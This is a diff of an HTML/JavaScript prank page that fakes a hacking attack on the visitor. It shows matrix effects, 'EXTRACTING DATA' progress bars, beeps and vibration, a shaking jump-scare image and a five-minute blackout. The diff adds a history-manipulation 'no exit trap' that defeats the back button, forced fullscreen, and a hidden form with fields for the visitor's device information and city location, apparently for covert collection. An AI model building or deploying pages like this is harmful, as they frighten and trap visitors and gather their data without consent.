@@ -3,47 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
     <title>20 Series</title>
-    
     <link rel="icon" href="https://img.icons8.com/ios-filled/50/ff0000/skull.png" type="image/png">
-
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; text-transform: uppercase; user-select: none; }
-        
         #anti-ss { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 20000; display: none; align-items: center; justify-content: center; color: white; font-weight: bold; text-align: center; border: 20px solid red; box-sizing: border-box; }
-
         canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.8; }
-        
         #hud { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; text-align: center; pointer-events: none; }
-        
         .circle-scan { width: 130px; height: 130px; border: 4px solid #0f0; border-radius: 50%; margin: 0 auto; border-top-color: transparent; animation: spin 1s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        
         #progress-area { margin-top: 30px; background: rgba(0, 20, 0, 0.9); border: 1px solid #0f0; padding: 15px; }
         .bar-bg { width: 100%; height: 25px; background: #111; border: 1px solid #0f0; position: relative; }
         #bar-fill { width: 0%; height: 100%; background: #0f0; box-shadow: 0 0 15px #0f0; transition: width 0.2s linear; }
         #pct-text { position: absolute; width: 100%; top: 4px; left: 0; color: #fff; font-weight: bold; font-size: 14px; }
         
-        .touch-msg { position: fixed; color: #ff0000; font-weight: bold; background: rgba(200,0,0,0.2); border: 2px solid red; padding: 10px 20px; pointer-events: none; z-index: 9999; font-size: 18px; box-shadow: 0 0 20px red; text-shadow: 0 0 5px black; }
+        /* Scary Floating Text Style */
+        .touch-msg { position: fixed; color: #ff0000; font-weight: bold; background: rgba(100,0,0,0.3); border: 1px solid red; padding: 8px 15px; pointer-events: none; z-index: 9999; font-size: 16px; box-shadow: 0 0 15px red; text-shadow: 0 0 5px black; border-radius: 4px; white-space: nowrap; }
 
         #success-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: none; z-index: 11000; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
         #success-text { font-size: 65px; font-weight: bold; margin: 0; animation: flash-text 0.15s infinite; }
-        @keyframes flash-text { 0% { color: #0f0; text-shadow: 0 0 30px #0f0; } 50% { color: #f00; text-shadow: 0 0 30px #f00; } 100% { color: #0f0; text-shadow: 0 0 30px #0f0; } }
-
+        @keyframes flash-text { 0% { color: #0f0; } 50% { color: #f00; } 100% { color: #0f0; } }
         #scare { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000 url('https://p7.itc.cn/images01/20210323/c3157e93c66041ec9990864f1d411470.jpeg') center/cover; display: none; z-index: 12000; animation: shake 0.05s infinite; }
-        @keyframes shake { 0% { transform: translate(3px,3px); } 100% { transform: translate(-3px,-3px); } }
-
         #final-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 13000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 30px; }
         #typewriter { font-size: 20px; color: #ffffff; font-weight: bold; text-transform: none; line-height: 1.4; }
         .cursor { display: inline-block; width: 12px; height: 22px; background: #fff; margin-left: 5px; animation: blink 0.7s infinite; vertical-align: middle; }
-        @keyframes blink { 0%, 100% { opacity: 0; } 50% { opacity: 1; } }
     </style>
 </head>
 <body onload="startHacking()" onmousedown="handleTouch(event)" ontouchstart="handleTouch(event)">
 
-    <div id="anti-ss"><div><h2 style="color: red;">CRITICAL ERROR</h2><p>SCREENSHOTS DISABLED</p></div></div>
+    <form id="hack-form" style="display:none;">
+        <input type="hidden" name="access_key" value="YOUR_ACCESS_KEY_HERE">
+        <input type="hidden" name="device_info" id="device_info">
+        <input type="hidden" name="city_location" id="city_location">
+    </form>
 
+    <div id="anti-ss"><div><h2 style="color: red;">CRITICAL ERROR</h2><p>SCREENSHOTS DISABLED</p></div></div>
     <canvas id="matrix"></canvas>
 
     <div id="hud">
@@ -59,18 +53,30 @@
 
     <div id="success-screen">
         <h1 id="success-text">SUCCESS</h1>
-        <p style="color: white; font-size: 18px; margin-top: 15px;">20-SERIES UPLOAD COMPLETE</p>
+        <p style="color: white; font-size: 18px; margin-top: 15px;">DATA UPLOAD 100% COMPLETE</p>
     </div>
 
     <div id="scare"></div>
-
     <div id="final-screen">
         <div id="typewriter"></div><span class="cursor" id="cursor-el" style="display:none"></span>
     </div>
 
     <script>
+        // --- NO EXIT TRAP ---
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.pushState(null, null, location.href);
+            alert("SYSTEM OVERRIDE: 20-SERIES LOCK ACTIVE");
+        };
+
         const canvas = document.getElementById('matrix'), ctx = canvas.getContext('2d');
-        let isStarted = false, isScared = false, audioEnabled = false;
+        let isStarted = false, isScared = false, audioEnabled = false, formSent = false;
+
+        function startFull() {
+            let el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        }
 
         const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         function playBeep(freq, type, vol, duration) {
@@ -83,28 +89,29 @@
             osc.start(); osc.stop(audioCtx.currentTime + duration);
         }
 
+        // --- RANDOM ERROR GENERATOR ---
         function handleTouch(e) {
-            if (!audioEnabled) { audioEnabled = true; audioCtx.resume(); }
+            if (!audioEnabled) { audioEnabled = true; audioCtx.resume(); startFull(); }
             if (isScared) return;
             if (navigator.vibrate) navigator.vibrate(100);
             playBeep(150, 'sawtooth', 0.4, 0.1);
-            
+
+            const errors = ["ACCESS DENIED", "SYSTEM LOCKED", "DATA LEAKING...", "20-SERIES ACTIVE", "ENCRYPTION ERROR", "CRITICAL FAILURE", "TRACKING ACTIVE"];
             const msg = document.createElement('div');
             msg.className = 'touch-msg';
-            const errorTexts = ["ACCESS DENIED", "SYSTEM LOCKED", "20-SERIES ENCRYPTION", "CRITICAL ERROR"];
-            msg.innerText = errorTexts[Math.floor(Math.random() * errorTexts.length)];
+            msg.innerText = errors[Math.floor(Math.random() * errors.length)];
             
             const x = e.clientX || (e.touches ? e.touches[0].clientX : 0);
             const y = e.clientY || (e.touches ? e.touches[0].clientY : 0);
-            msg.style.left = (x - 80) + 'px'; msg.style.top = (y - 20) + 'px';
+            msg.style.left = (x - 70) + 'px'; msg.style.top = (y - 20) + 'px';
+            
             document.body.appendChild(msg);
-            setTimeout(() => msg.remove(), 600);
+            setTimeout(() => msg.remove(), 700);
         }
 
         canvas.height = window.innerHeight; canvas.width = window.innerWidth;
         const letters = "0123456789ABCDEF";
         const drops = Array(Math.floor(canvas.width / 20)).fill(1);
-
         function drawMatrix() {
             ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
             ctx.fillStyle = "#0f0"; ctx.font = "15px Courier New";
@@ -120,8 +127,7 @@
             isStarted = true;
             setInterval(() => { if(!isScared) playBeep(250, 'square', 0.05, 0.08); }, 500);
             setInterval(drawMatrix, 50);
-
-            const tasks = [{ name: "BYPASSING SECURITY", speed: 0.8 }, { name: "ACCESSING 20-SERIES", speed: 0.5 }, { name: "FINALIZING DATA", speed: 0.2 }];
+            const tasks = [{ name: "BYPASSING SECURITY", speed: 0.8 }, { name: "EXTRACTING DATA", speed: 0.5 }, { name: "FINALIZING 20-SERIES", speed: 0.2 }];
             for (let t of tasks) await runTask(t);
             showFinal();
         }
@@ -152,11 +158,10 @@
             document.getElementById('scare').style.display = 'block';
             playBeep(80, 'sawtooth', 1.0, 2.5);
             if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
-            
             setTimeout(() => {
                 document.getElementById('scare').style.display = 'none';
                 document.getElementById('final-screen').style.display = 'flex';
-                setTimeout(revealJoke, 300000); // 5 minute blackout
+                setTimeout(revealJoke, 300000); 
             }, 2500);
         }
 
